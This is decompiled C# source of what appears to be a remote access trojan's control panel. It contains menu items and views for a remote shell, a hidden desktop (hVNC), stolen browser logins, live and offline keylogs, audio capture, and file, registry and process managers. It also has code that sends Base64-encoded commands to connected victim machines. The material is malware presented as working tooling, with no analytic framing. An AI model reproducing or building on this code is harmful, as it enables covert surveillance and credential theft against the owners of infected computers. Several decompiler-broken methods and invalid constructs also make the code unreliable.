        this.vmethod_348().Name = "RemoteShellToolStripMenuItem";
        this.vmethod_348().Size = new Size(0x8e, 0x16);
        this.vmethod_348().Text = "Remote shell";
        this.vmethod_562().Image = (Image) manager.GetObject("ServicesToolStripMenuItem.Image");
        this.vmethod_562().ImageScaling = ToolStripItemImageScaling.None;
        this.vmethod_562().Name = "ServicesToolStripMenuItem";
        this.vmethod_562().Size = new Size(0x8e, 0x16);
        this.vmethod_562().Text = "Services";
        this.vmethod_522().Image = (Image) manager.GetObject("SoftwareToolStripMenuItem.Image");
        this.vmethod_522().ImageScaling = ToolStripItemImageScaling.None;
        this.vmethod_522().Name = "SoftwareToolStripMenuItem";
        this.vmethod_522().Size = new Size(0x8e, 0x16);
        this.vmethod_522().Text = "Software";
        this.vmethod_626().Image = (Image) manager.GetObject("WindowsToolStripMenuItem.Image");
        this.vmethod_626().ImageScaling = ToolStripItemImageScaling.None;
        this.vmethod_626().Name = "WindowsToolStripMenuItem";
        this.vmethod_626().Size = new Size(0x8e, 0x16);
        this.vmethod_626().Text = "Windows";
        this.vmethod_356().Image = (Image) manager.GetObject("ConnectionsToolStripMenuItem.Image");
        this.vmethod_356().ImageScaling = ToolStripItemImageScaling.None;
        this.vmethod_356().Name = "ConnectionsToolStripMenuItem";
        this.vmethod_356().Size = new Size(0x8d, 0x16);
        this.vmethod_356().Text = "Connections";
        this.vmethod_776().Image = Class131.smethod_15();
        this.vmethod_776().ImageScaling = ToolStripItemImageScaling.None;
        this.vmethod_776().Name = "HVNCToolStripMenuItem";
        this.vmethod_776().Size = new Size(0xc2, 0x16);
        this.vmethod_776().Text = "Hidden desktop/hVNC";
        ToolStripItem[] itemArray52 = new ToolStripItem[] { this.vmethod_414() };
        this.vmethod_412().DropDownItems.AddRange(itemArray52);
        this.vmethod_412().Image = (Image) manager.GetObject("CredentialsToolStripMenuItem.Image");
        this.vmethod_412().ImageScaling = ToolStripItemImageScaling.None;
        this.vmethod_412().Name = "CredentialsToolStripMenuItem";
        this.vmethod_412().Size = new Size(0xc2, 0x16);
        this.vmethod_412().Text = "Passwords";
        this.vmethod_414().Name = "BrowserToolStripMenuItem";
        this.vmethod_414().Size = new Size(0x6d, 0x16);
        this.vmethod_414().Text = "Logins";
        this.vmethod_458().Image = (Image) manager.GetObject("RemoteBrowserToolStripMenuItem.Image");
        this.vmethod_458().ImageScaling = ToolStripItemImageScaling.None;
        this.vmethod_458().Name = "RemoteBrowserToolStripMenuItem";
        this.vmethod_458().Size = new Size(0xc2, 0x16);
        this.vmethod_458().Text = "Remote browser";
        this.vmethod_818().AutoSize = true;
        this.vmethod_818().BackColor = Color.Transparent;
        this.vmethod_818().Location = new Point(0x4e, 5);
        this.vmethod_818().Margin = new Padding(1);
        this.vmethod_818().Name = "chkKeylogOnlineNewWnd";
        this.vmethod_818().Size = new Size(0x7e, 0x11);
        this.vmethod_818().TabIndex = 0x5b;
        this.vmethod_818().Text = "Show in new window";
        this.vmethod_818().UseVisualStyleBackColor = false;
        this.vmethod_552().Alignment = ListViewAlignment.Left;
        this.vmethod_552().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_552().AutoArrange = false;
        this.vmethod_552().BackColor = Color.White;
        this.vmethod_552().ContextMenuStrip = this.vmethod_6();
        this.vmethod_552().Enabled = false;
        this.vmethod_552().Font = new Font("Microsoft Sans Serif", 8.142858f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_552().ForeColor = Color.Black;
        this.vmethod_552().FullRowSelect = true;
        this.vmethod_552().HeaderStyle = ColumnHeaderStyle.Nonclickable;
        this.vmethod_552().HideSelection = false;
        this.vmethod_552().Location = new Point(2, 2);
        this.vmethod_552().Margin = new Padding(2);
        this.vmethod_552().Name = "lvInformation";
        this.vmethod_552().Size = new Size(970, 0x21b);
        this.vmethod_552().TabIndex = 0x13;
        this.vmethod_552().UseCompatibleStateImageBehavior = false;
        this.vmethod_552().View = View.Details;
        this.vmethod_78().Alignment = ListViewAlignment.Left;
        this.vmethod_78().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_78().AutoArrange = false;
        this.vmethod_78().BackColor = Color.White;
        this.vmethod_78().ContextMenuStrip = this.vmethod_34();
        this.vmethod_78().Font = new Font("Microsoft Sans Serif", 8.142858f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_78().ForeColor = Color.Black;
        this.vmethod_78().FullRowSelect = true;
        this.vmethod_78().HideSelection = false;
        this.vmethod_78().Location = new Point(1, 3);
        this.vmethod_78().Margin = new Padding(1);
        this.vmethod_78().Name = "lvProcesses";
        this.vmethod_78().Size = new Size(0x3cc, 0x207);
        this.vmethod_78().TabIndex = 0x13;
        this.vmethod_78().UseCompatibleStateImageBehavior = false;
        this.vmethod_78().View = View.Details;
        this.vmethod_76().Alignment = ListViewAlignment.Left;
        this.vmethod_76().Anchor = AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_76().AutoArrange = false;
        this.vmethod_76().BackColor = Color.White;
        this.vmethod_76().ContextMenuStrip = this.vmethod_110();
        this.vmethod_76().Font = new Font("Microsoft Sans Serif", 8.142858f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_76().ForeColor = Color.Black;
        this.vmethod_76().FullRowSelect = true;
        this.vmethod_76().HideSelection = false;
        this.vmethod_76().Location = new Point(5, 0x1d);
        this.vmethod_76().Margin = new Padding(1);
        this.vmethod_76().Name = "lvFilemanagerDirs";
        this.vmethod_76().Size = new Size(0xe1, 0x1ed);
        this.vmethod_76().Sorting = SortOrder.Ascending;
        this.vmethod_76().TabIndex = 0x12;
        this.vmethod_76().TabStop = false;
        this.vmethod_76().UseCompatibleStateImageBehavior = false;
        this.vmethod_76().View = View.Details;
        this.vmethod_720().Alignment = ListViewAlignment.Default;
        this.vmethod_720().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_720().AutoArrange = false;
        this.vmethod_720().BackColor = Color.White;
        this.vmethod_720().ContextMenuStrip = this.vmethod_102();
        this.vmethod_720().Font = new Font("Microsoft Sans Serif", 8.142858f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_720().ForeColor = Color.Black;
        this.vmethod_720().FullRowSelect = true;
        this.vmethod_720().HideSelection = false;
        this.vmethod_720().Location = new Point(0xe9, 0x1d);
        this.vmethod_720().Margin = new Padding(1);
        this.vmethod_720().Name = "lvFilemanagerFiles";
        this.vmethod_720().Size = new Size(0x2e7, 0x1ed);
        this.vmethod_720().TabIndex = 0x30;
        this.vmethod_720().UseCompatibleStateImageBehavior = false;
        this.vmethod_720().View = View.Details;
        this.vmethod_388().Alignment = ListViewAlignment.Left;
        this.vmethod_388().Anchor = AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_388().AutoArrange = false;
        this.vmethod_388().BackColor = Color.White;
        this.vmethod_388().ContextMenuStrip = this.vmethod_390();
        this.vmethod_388().Font = new Font("Microsoft Sans Serif", 8.142858f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_388().ForeColor = Color.Black;
        this.vmethod_388().FullRowSelect = true;
        this.vmethod_388().HideSelection = false;
        this.vmethod_388().Location = new Point(2, 0x1a);
        this.vmethod_388().Margin = new Padding(1);
        this.vmethod_388().Name = "lvKeylogOfflineLogs";
        this.vmethod_388().Size = new Size(0xb7, 0x1f0);
        this.vmethod_388().TabIndex = 0x1f;
        this.vmethod_388().TabStop = false;
        this.vmethod_388().UseCompatibleStateImageBehavior = false;
        this.vmethod_388().View = View.Details;
        this.vmethod_316().Alignment = ListViewAlignment.Left;
        this.vmethod_316().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_316().AutoArrange = false;
        this.vmethod_316().BackColor = Color.White;
        this.vmethod_316().ContextMenuStrip = this.vmethod_332();
        this.vmethod_316().Font = new Font("Microsoft Sans Serif", 8.142858f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_316().ForeColor = Color.Black;
        this.vmethod_316().FullRowSelect = true;
        this.vmethod_316().HeaderStyle = ColumnHeaderStyle.Nonclickable;
        this.vmethod_316().HideSelection = false;
        this.vmethod_316().Location = new Point(5, 0x25);
        this.vmethod_316().Margin = new Padding(1);
        this.vmethod_316().Name = "lvAudio";
        this.vmethod_316().Size = new Size(0x3cd, 0x1e5);
        this.vmethod_316().TabIndex = 0x1d;
        this.vmethod_316().UseCompatibleStateImageBehavior = false;
        this.vmethod_316().View = View.Details;
        this.vmethod_718().Alignment = ListViewAlignment.Left;
        this.vmethod_718().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_718().AutoArrange = false;
        this.vmethod_718().BackColor = Color.White;
        this.vmethod_718().ContextMenuStrip = this.vmethod_360();
        this.vmethod_718().Font = new Font("Microsoft Sans Serif", 8.142858f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_718().ForeColor = Color.Black;
        this.vmethod_718().FullRowSelect = true;
        this.vmethod_718().HideSelection = false;
        this.vmethod_718().Location = new Point(3, 3);
        this.vmethod_718().Margin = new Padding(1);
        this.vmethod_718().Name = "lvConnections";
        this.vmethod_718().Size = new Size(0x3cb, 0x207);
        this.vmethod_718().TabIndex = 0x2f;
        this.vmethod_718().UseCompatibleStateImageBehavior = false;
        this.vmethod_718().View = View.Details;
        this.vmethod_418().Alignment = ListViewAlignment.Left;
        this.vmethod_418().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_418().AutoArrange = false;
        this.vmethod_418().BackColor = Color.White;
        this.vmethod_418().ContextMenuStrip = this.vmethod_420();
        this.vmethod_418().Font = new Font("Microsoft Sans Serif", 8.142858f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_418().ForeColor = Color.Black;
        this.vmethod_418().FullRowSelect = true;
        this.vmethod_418().HeaderStyle = ColumnHeaderStyle.Nonclickable;
        this.vmethod_418().HideSelection = false;
        this.vmethod_418().Location = new Point(3, 3);
        this.vmethod_418().Margin = new Padding(1);
        this.vmethod_418().Name = "lvCredentialsLogins";
        this.vmethod_418().Size = new Size(970, 0x207);
        this.vmethod_418().TabIndex = 0x13;
        this.vmethod_418().UseCompatibleStateImageBehavior = false;
        this.vmethod_418().View = View.Details;
        this.vmethod_550().Alignment = ListViewAlignment.Left;
        this.vmethod_550().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_550().AutoArrange = false;
        this.vmethod_550().BackColor = Color.White;
        this.vmethod_550().ContextMenuStrip = this.vmethod_524();
        this.vmethod_550().Font = new Font("Microsoft Sans Serif", 8.142858f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_550().ForeColor = Color.Black;
        this.vmethod_550().FullRowSelect = true;
        this.vmethod_550().HideSelection = false;
        this.vmethod_550().Location = new Point(5, 5);
        this.vmethod_550().Margin = new Padding(2);
        this.vmethod_550().Name = "lvSoftware";
        this.vmethod_550().Size = new Size(0x3c7, 0x203);
        this.vmethod_550().TabIndex = 0x33;
        this.vmethod_550().UseCompatibleStateImageBehavior = false;
        this.vmethod_550().View = View.Details;
        this.vmethod_578().Alignment = ListViewAlignment.Left;
        this.vmethod_578().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_578().AutoArrange = false;
        this.vmethod_578().BackColor = Color.White;
        this.vmethod_578().ContextMenuStrip = this.vmethod_580();
        this.vmethod_578().Font = new Font("Microsoft Sans Serif", 8.142858f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_578().ForeColor = Color.Black;
        this.vmethod_578().FullRowSelect = true;
        this.vmethod_578().HideSelection = false;
        this.vmethod_578().Location = new Point(2, 3);
        this.vmethod_578().Margin = new Padding(1);
        this.vmethod_578().Name = "lvServices";
        this.vmethod_578().Size = new Size(0x3cc, 0x207);
        this.vmethod_578().TabIndex = 0x2f;
        this.vmethod_578().UseCompatibleStateImageBehavior = false;
        this.vmethod_578().View = View.Details;
        this.vmethod_624().Alignment = ListViewAlignment.Left;
        this.vmethod_624().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_624().AutoArrange = false;
        this.vmethod_624().BackColor = Color.White;
        this.vmethod_624().ContextMenuStrip = this.vmethod_628();
        this.vmethod_624().Font = new Font("Microsoft Sans Serif", 8.142858f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_624().ForeColor = Color.Black;
        this.vmethod_624().FullRowSelect = true;
        this.vmethod_624().HideSelection = false;
        this.vmethod_624().Location = new Point(2, 3);
        this.vmethod_624().Margin = new Padding(1);
        this.vmethod_624().Name = "lvWindows";
        this.vmethod_624().Size = new Size(0x3cc, 0x207);
        this.vmethod_624().TabIndex = 0x33;
        this.vmethod_624().UseCompatibleStateImageBehavior = false;
        this.vmethod_624().View = View.Details;
        this.vmethod_748().Alignment = ListViewAlignment.Left;
        this.vmethod_748().Anchor = AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_748().AutoArrange = false;
        this.vmethod_748().BackColor = Color.White;
        this.vmethod_748().ContextMenuStrip = this.vmethod_766();
        this.vmethod_748().Font = new Font("Microsoft Sans Serif", 8.142858f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_748().ForeColor = Color.Black;
        this.vmethod_748().FullRowSelect = true;
        this.vmethod_748().HideSelection = false;
        this.vmethod_748().Location = new Point(5, 0x1d);
        this.vmethod_748().Margin = new Padding(1);
        this.vmethod_748().Name = "lvRegistryKeys";
        this.vmethod_748().Size = new Size(0xe1, 0x1ed);
        this.vmethod_748().Sorting = SortOrder.Ascending;
        this.vmethod_748().TabIndex = 0x31;
        this.vmethod_748().TabStop = false;
        this.vmethod_748().UseCompatibleStateImageBehavior = false;
        this.vmethod_748().View = View.Details;
        this.vmethod_750().Alignment = ListViewAlignment.Left;
        this.vmethod_750().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_750().AutoArrange = false;
        this.vmethod_750().BackColor = Color.White;
        this.vmethod_750().ContextMenuStrip = this.vmethod_758();
        this.vmethod_750().Font = new Font("Microsoft Sans Serif", 8.142858f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_750().ForeColor = Color.Black;
        this.vmethod_750().FullRowSelect = true;
        this.vmethod_750().HideSelection = false;
        this.vmethod_750().Location = new Point(0xe9, 0x1d);
        this.vmethod_750().Margin = new Padding(1);
        this.vmethod_750().Name = "lvRegistryValues";
        this.vmethod_750().Size = new Size(0x2e7, 0x1ed);
        this.vmethod_750().TabIndex = 0x34;
        this.vmethod_750().UseCompatibleStateImageBehavior = false;
        this.vmethod_750().View = View.Details;
        base.AutoScaleDimensions = new SizeF(6f, 13f);
        base.AutoScaleMode = AutoScaleMode.Font;
        base.ClientSize = new Size(0x3d6, 0x23f);
        base.Controls.Add(this.vmethod_18());
        base.Controls.Add(this.vmethod_0());
        this.DoubleBuffered = true;
        this.ForeColor = Color.Black;
        base.KeyPreview = true;
        base.MainMenuStrip = this.vmethod_0();
        base.Margin = new Padding(2);
        base.Name = "fDashboard";
        base.Opacity = 0.0;
        base.ShowIcon = false;
        base.ShowInTaskbar = false;
        this.vmethod_0().ResumeLayout(false);
        this.vmethod_0().PerformLayout();
        this.vmethod_6().ResumeLayout(false);
        this.vmethod_18().ResumeLayout(false);
        this.vmethod_20().ResumeLayout(false);
        this.vmethod_22().ResumeLayout(false);
        this.vmethod_22().PerformLayout();
        this.vmethod_32().ResumeLayout(false);
        this.vmethod_122().ResumeLayout(false);
        this.vmethod_122().PerformLayout();
        this.vmethod_34().ResumeLayout(false);
        this.vmethod_70().ResumeLayout(false);
        this.vmethod_396().ResumeLayout(false);
        this.vmethod_396().PerformLayout();
        this.vmethod_204().ResumeLayout(false);
        this.vmethod_204().PerformLayout();
        this.vmethod_156().ResumeLayout(false);
        this.vmethod_156().PerformLayout();
        this.vmethod_110().ResumeLayout(false);
        this.vmethod_102().ResumeLayout(false);
        this.vmethod_252().ResumeLayout(false);
        this.vmethod_252().PerformLayout();
        this.vmethod_270().ResumeLayout(false);
        this.vmethod_482().ResumeLayout(false);
        this.vmethod_482().PerformLayout();
        this.vmethod_390().ResumeLayout(false);
        this.vmethod_284().ResumeLayout(false);
        this.vmethod_284().PerformLayout();
        this.vmethod_476().ResumeLayout(false);
        this.vmethod_476().PerformLayout();
        this.vmethod_300().ResumeLayout(false);
        this.vmethod_300().PerformLayout();
        this.vmethod_308().ResumeLayout(false);
        this.vmethod_308().PerformLayout();
        this.vmethod_332().ResumeLayout(false);
        this.vmethod_350().ResumeLayout(false);
        this.vmethod_358().ResumeLayout(false);
        this.vmethod_494().ResumeLayout(false);
        this.vmethod_494().PerformLayout();
        this.vmethod_360().ResumeLayout(false);
        this.vmethod_416().ResumeLayout(false);
        this.vmethod_468().ResumeLayout(false);
        this.vmethod_468().PerformLayout();
        this.vmethod_420().ResumeLayout(false);
        this.vmethod_460().ResumeLayout(false);
        this.vmethod_460().PerformLayout();
        this.vmethod_520().ResumeLayout(false);
        this.vmethod_540().ResumeLayout(false);
        this.vmethod_540().PerformLayout();
        this.vmethod_524().ResumeLayout(false);
        this.vmethod_564().ResumeLayout(false);
        this.vmethod_568().ResumeLayout(false);
        this.vmethod_568().PerformLayout();
        this.vmethod_580().ResumeLayout(false);
        this.vmethod_612().ResumeLayout(false);
        this.vmethod_616().ResumeLayout(false);
        this.vmethod_616().PerformLayout();
        this.vmethod_628().ResumeLayout(false);
        this.vmethod_722().ResumeLayout(false);
        this.vmethod_732().ResumeLayout(false);
        this.vmethod_732().PerformLayout();
        this.vmethod_766().ResumeLayout(false);
        this.vmethod_758().ResumeLayout(false);
        this.vmethod_778().ResumeLayout(false);
        this.vmethod_778().PerformLayout();
        this.vmethod_72().ResumeLayout(false);
        ((ISupportInitialize) this.vmethod_248()).EndInit();
        ((ISupportInitialize) this.vmethod_24()).EndInit();
        ((ISupportInitialize) this.vmethod_264()).EndInit();
        ((ISupportInitialize) this.vmethod_682()).EndInit();
        ((ISupportInitialize) this.vmethod_680()).EndInit();
        ((ISupportInitialize) this.vmethod_464()).EndInit();
        ((ISupportInitialize) this.vmethod_806()).EndInit();
        base.ResumeLayout(false);
        base.PerformLayout();
    }

    public void method_0()
    {
        this.object_0 = true;
        this.string_9 = "# [DISCONNECTED] " + this.string_6;
        this.vmethod_774().RunWorkerAsync();
    }

    public void method_1(ref GClass1 gclass1_1, ref string string_12, ref string string_13, ref string string_14, ref string string_15, ref string string_16)
    {
        string[] textArray1 = new string[] { string_12, ":", string_13, "^", string_14, " [", string_15, "]" };
        this.Text = string.Concat(textArray1);
        this.string_6 = this.Text;
        base.Visible = true;
        this.gclass1_0 = gclass1_1;
        this.string_0 = string_12;
        this.string_1 = string_13;
        this.string_2 = string_14;
        this.string_3 = string_15;
        this.string_4 = this.gclass1_0.string_0;
        this.string_5 = string_16;
        this.vmethod_456().Text = !Class130.concurrentDictionary_3[this.string_4].IS_SSL ? "Connection rerouted" : "Connection encrypted";
        this.vmethod_456().Image = Class130.concurrentDictionary_3[this.string_4].ICO_TYPE;
        this.vmethod_552().Enabled = false;
        this.vmethod_554().BringToFront();
        this.vmethod_554().Visible = true;
        if (Class130.concurrentDictionary_3[this.string_4].pending_dc)
        {
            this.method_0();
        }
        else
        {
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "info|1";
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    public void method_10(ref long long_1)
    {
        // Unresolved stack state at '0000000D'
    }

    public void method_100(ref string string_12)
    {
        if (this.vmethod_286().InvokeRequired)
        {
            object[] args = new object[] { string_12 };
            this.vmethod_286().Invoke(new Delegate8(this.method_100), args);
        }
        else
        {
            XmlDocument document1 = new XmlDocument();
            document1.LoadXml("<root>" + string_12 + "</root>");
            StringBuilder builder = new StringBuilder();
            IEnumerator enumerator = document1.GetElementsByTagName("block").GetEnumerator();
            while (enumerator.MoveNext())
            {
                XmlNode current = (XmlNode) enumerator.Current;
                XmlNode node = current.SelectSingleNode("title");
                XmlNode node2 = current.SelectSingleNode("date");
                XmlNode node3 = current.SelectSingleNode("data");
                string str3 = string.Empty;
                string expression = string.Empty;
                string str2 = string.Empty;
                if (node != null)
                {
                    expression = this.method_102(ref Encoding.UTF8.GetString(Convert.FromBase64String(node.InnerText)));
                }
                if (node2 != null)
                {
                    str3 = this.method_102(ref Encoding.UTF8.GetString(Convert.FromBase64String(node2.InnerText)));
                }
                if (node3 != null)
                {
                    str2 = this.method_102(ref Encoding.UTF8.GetString(Convert.FromBase64String(node3.InnerText)));
                }
                if (Strings.Len(expression) > 0)
                {
                    if (this.bool_1)
                    {
                        this.bool_1 = false;
                    }
                    else if (!Class135.smethod_0().ConKlgColors)
                    {
                        builder.Append("\r\n\r\n");
                    }
                    else
                    {
                        this.vmethod_286().Enabled = true;
                        this.vmethod_286().ReadOnly = true;
                        this.vmethod_286().AppendText("\r\n\r\n");
                        if (this.bool_2)
                        {
                            this.fKeylogOnline_0.vmethod_0().Enabled = true;
                            this.fKeylogOnline_0.vmethod_0().ReadOnly = true;
                            this.fKeylogOnline_0.vmethod_0().AppendText("\r\n\r\n");
                        }
                    }
                    if (!Class135.smethod_0().ConKlgColors)
                    {
                        builder.Append(expression + " [" + str3 + "]\r\n");
                    }
                    else
                    {
                        this.vmethod_286().Enabled = true;
                        this.vmethod_286().ReadOnly = true;
                        this.vmethod_286().SelectionColor = Color.Green;
                        this.vmethod_286().AppendText(expression);
                        this.vmethod_286().SelectionColor = Color.Black;
                        if (this.bool_2)
                        {
                            this.fKeylogOnline_0.vmethod_0().Enabled = true;
                            this.fKeylogOnline_0.vmethod_0().ReadOnly = true;
                            this.fKeylogOnline_0.vmethod_0().SelectionColor = Color.Green;
                            this.fKeylogOnline_0.vmethod_0().AppendText(expression);
                            this.fKeylogOnline_0.vmethod_0().SelectionColor = Color.Black;
                        }
                        string text = " [" + str3 + "]\r\n";
                        this.vmethod_286().Enabled = true;
                        this.vmethod_286().ReadOnly = true;
                        this.vmethod_286().SelectionColor = Color.DeepSkyBlue;
                        this.vmethod_286().AppendText(text);
                        this.vmethod_286().SelectionColor = Color.Black;
                        if (this.bool_2)
                        {
                            this.fKeylogOnline_0.vmethod_0().Enabled = true;
                            this.fKeylogOnline_0.vmethod_0().ReadOnly = true;
                            this.fKeylogOnline_0.vmethod_0().SelectionColor = Color.DeepSkyBlue;
                            this.fKeylogOnline_0.vmethod_0().AppendText(text);
                            this.fKeylogOnline_0.vmethod_0().SelectionColor = Color.Black;
                        }
                    }
                }
                builder.Append(str2);
                if (Class135.smethod_0().ConKlgColors)
                {
                    this.vmethod_286().AppendText(str2);
                    if (this.bool_2)
                    {
                        this.fKeylogOnline_0.vmethod_0().AppendText(str2);
                    }
                }
                else
                {
                    this.vmethod_286().AppendText(builder.ToString());
                    if (this.bool_2)
                    {
                        this.fKeylogOnline_0.vmethod_0().AppendText(builder.ToString());
                    }
                }
            }
        }
    }

    public void method_101(ref bool bool_3)
    {
        // Unresolved stack state at '0000000D'
    }

    private string method_102(ref string string_12)
    {
        int num2;
        ProjectData.ClearProjectError();
        string str = string_12;
        if (num2 != 0)
        {
            ProjectData.ClearProjectError();
        }
        return str;
    }

    private void method_103(object sender, EventArgs e)
    {
        string left = Interaction.InputBox("Enter new folder name", Application.ProductName, string.Empty, -1, -1);
        if (Operators.CompareString(left, string.Empty, true) == 0)
        {
            Interaction.MsgBox("Invalid folder name!", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else
        {
            bool flag;
            ref int index = ref 0;
            ref string path = ref left;
            string first = string.Empty;
            string fileName = Path.GetFileName(path);
            first = Path.GetDirectoryName(path);
            if (Information.IsNothing((int) index))
            {
                flag = !Enumerable.Any<char>(Enumerable.Intersect<char>(fileName, Path.GetInvalidFileNameChars())) && !Enumerable.Any<char>(Enumerable.Intersect<char>(first, Path.GetInvalidPathChars()));
            }
            else
            {
                IEnumerable<char> source = Enumerable.Intersect<char>(fileName, Path.GetInvalidFileNameChars());
                if (Enumerable.Any<char>(source))
                {
                    index = Strings.Len(first) + fileName.IndexOf(Enumerable.First<char>(source));
                    flag = false;
                }
                else
                {
                    source = Enumerable.Intersect<char>(first, Path.GetInvalidPathChars());
                    if (!Enumerable.Any<char>(source))
                    {
                        flag = true;
                    }
                    else
                    {
                        index = first.IndexOf(Enumerable.First<char>(source));
                        flag = false;
                    }
                }
            }
            if (!flag)
            {
                Interaction.MsgBox("Invalid folder name!", MsgBoxStyle.Exclamation, Application.ProductName);
            }
            else
            {
                string str5;
                string str4 = Strings.Replace(this.vmethod_398().Text, "Path: ", string.Empty, 1, -1, CompareMethod.Text);
                CClient client = Class130.concurrentDictionary_3[str5 = this.string_4];
                long num2 = 0L;
                ref string s = ref "files_new_dir|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(str4 + @"\" + left));
                ref CClient clientRef = ref client;
                ConcurrentDictionary<string, CClient> dictionary = Class130.concurrentDictionary_3;
                try
                {
                    ref double numRef2;
                    if (num2 > 0L)
                    {
                        Thread.Sleep((int) (num2 * 0xea60L));
                    }
                    s = s + "@";
                    byte[] bytes = Encoding.UTF8.GetBytes(s);
                    clientRef.sock_async.method_6(bytes);
                    *(numRef2 = ref clientRef.stats_bytes_out) = numRef2 + s.Length;
                    *(numRef2 = ref Class130.struct20_0.double_3) = numRef2 + s.Length;
                    *(numRef2 = ref Class130.struct20_0.double_5) = numRef2 + 1.0;
                }
                catch (Exception exception1)
                {
                    Exception ex = exception1;
                    ProjectData.SetProjectError(ex);
                    Exception local2 = ex;
                    ProjectData.ClearProjectError();
                }
                dictionary[str5] = client;
            }
        }
    }

    private void method_104(object sender, EventArgs e)
    {
        this.vmethod_18().SelectedIndex = 7;
        this.method_41();
    }

    private void method_105(object sender, EventArgs e)
    {
        this.vmethod_316().Items.Clear();
        this.concurrentStack_1.Clear();
        this.concurrentStack_2.Clear();
    }

    private void method_106(object sender, EventArgs e)
    {
        if ((this.concurrentStack_1.Count > 0) & (this.vmethod_316().SelectedItems.Count > 0))
        {
            MemoryStream stream = new MemoryStream();
            GClass7 class2 = this.vmethod_316();
            int num4 = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                long num3;
                if (num2 <= num4)
                {
                    if (!class2.Items[num2].Selected)
                    {
                        num2++;
                        continue;
                    }
                    num3 = num2;
                }
                int num5 = class2.Items.Count - 1;
                int index = 0;
                while (true)
                {
                    if (index > num5)
                    {
                        class2 = null;
                        RawSourceWaveStream stream2 = new RawSourceWaveStream(stream, Enumerable.ElementAtOrDefault<WaveFormat>(this.concurrentStack_2, (int) num3));
                        this.method_116(stream2);
                        break;
                    }
                    if (class2.Items[index].Selected)
                    {
                        byte[] buffer = new byte[((int) (Enumerable.ElementAtOrDefault<RawSourceWaveStream>(this.concurrentStack_1, index).get_Length() - 1L)) + 1];
                        if (Enumerable.ElementAtOrDefault<WaveFormat>(this.concurrentStack_2, index).get_SampleRate() != Enumerable.ElementAtOrDefault<WaveFormat>(this.concurrentStack_2, (int) num3).get_SampleRate())
                        {
                            Interaction.MsgBox("Playback of mixed sample rates not supported.\r\nPlease, select matching sample rates.", MsgBoxStyle.Exclamation, Application.ProductName);
                            return;
                        }
                        Enumerable.ElementAtOrDefault<RawSourceWaveStream>(this.concurrentStack_1, index).set_Position(0L);
                        Enumerable.ElementAtOrDefault<RawSourceWaveStream>(this.concurrentStack_1, index).Read(buffer, 0, (int) Enumerable.ElementAtOrDefault<RawSourceWaveStream>(this.concurrentStack_1, index).get_Length());
                        stream.Write(buffer, 0, buffer.Length);
                    }
                    index++;
                }
                break;
            }
        }
    }

    private void method_107(object sender, EventArgs e)
    {
        if ((this.concurrentStack_1.Count > 0) & (this.vmethod_316().SelectedItems.Count > 0))
        {
            MemoryStream stream = new MemoryStream();
            GClass7 class2 = this.vmethod_316();
            int num4 = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                long num3;
                if (num2 <= num4)
                {
                    if (!class2.Items[num2].Selected)
                    {
                        num2++;
                        continue;
                    }
                    num3 = num2;
                }
                int num5 = class2.Items.Count - 1;
                int index = 0;
                while (true)
                {
                    if (index > num5)
                    {
                        class2 = null;
                        this.vmethod_340().Filter = "Wav Files (*.wav*)|*.wav";
                        this.vmethod_340().FilterIndex = 1;
                        this.vmethod_340().RestoreDirectory = true;
                        if (this.vmethod_340().ShowDialog() == DialogResult.OK)
                        {
                            byte[] source = this.method_108(ref stream);
                            LameMP3FileWriter writer1 = new LameMP3FileWriter(this.vmethod_340().FileName, Enumerable.ElementAtOrDefault<WaveFormat>(this.concurrentStack_2, (int) num3), 0x80, null);
                            writer1.Write(Enumerable.ToArray<byte>(source), 0, source.Length);
                            writer1.Flush();
                            writer1.Close();
                        }
                        break;
                    }
                    if (class2.Items[index].Selected)
                    {
                        byte[] buffer = new byte[((int) (Enumerable.ElementAtOrDefault<RawSourceWaveStream>(this.concurrentStack_1, index).get_Length() - 1L)) + 1];
